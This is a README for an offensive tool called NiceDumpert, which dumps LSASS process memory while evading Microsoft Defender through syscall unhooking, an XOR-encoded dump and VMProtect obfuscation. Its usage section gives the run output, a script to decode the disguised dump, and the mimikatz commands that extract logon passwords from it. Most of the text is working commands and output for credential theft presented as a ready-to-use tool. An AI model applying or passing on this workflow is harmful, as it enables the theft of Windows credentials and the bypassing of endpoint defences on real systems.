# NiceDumpert
A simple and hybrid LSA dump tool, combining **NiceKatz** and **Dumpert** to bypass **Defender**.

# Features
- Multi-platform Syscall/Unhook from Dumpert
- MinidumpWriteDump Callback(*with xor encode*) from NiceKatz
- Mutation and Virtualization from VMProtect

# Build Platform
- Windows SDK Version: 10.0.22000.0
- Platform Toolset: Visual Studio 2022(v143)
- C++ Language Standart: 14

# Usage
- Dump
```
C:\Project>NiceDumpert.vmp.exe
[1] Checking OS version details:
        [+] Operating System is Windows 10 or Server 2016, build number 19044
        [+] Mapping version specific System calls.
[2] Checking Process details:
        [+] Process ID of lsass.exe is: 772
        [+] NtReadVirtualMemory function pointer at: 0x00007FFA8ACAD890
        [+] NtReadVirtualMemory System call nr is: 0x3f
        [+] Unhooking NtReadVirtualMemory.
[3] Create memorydump file:
        [+] Open a process handle.
[+] Dumping PID 772 via MiniDumpWriteDump
[+] Target process has been dumped to memory successfully
[+] Writing process dump to disk
[+] Process dump of PID 772 written to outfile: vKcyDX.pnk
        [+] Dump succesful.
```

- Decode
```python
python decode.py vKcyDX.pnk out.dmp
[*] vKcyDX.pnk XOR b'K'
[*] Saved to out.dmp.
```

- MimiDump
```
mimikatz # sekurlsa::minidump out.dmp
mimikatz # sekurlsa::logonpasswords
```

# Shout Out
to the following projects:
- [Dumpert](https://github.com/outflanknl/Dumpert)
- [NiceKatz](https://github.com/0xDeku/NiceKatz)
